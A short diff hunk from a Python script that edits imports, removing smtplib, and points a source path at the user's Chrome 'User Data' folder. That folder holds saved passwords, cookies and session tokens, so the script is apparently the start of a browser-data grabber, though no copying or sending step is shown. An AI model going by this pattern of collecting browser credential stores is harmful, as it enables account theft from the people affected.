@@ -1,4 +1,5 @@
-import shutil, os, smtplib, colorama, threading, time, sys, art
+import shutil, os, colorama, threading, time
+from art import *
 #from email.message import EmailMessage
 
 src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data"
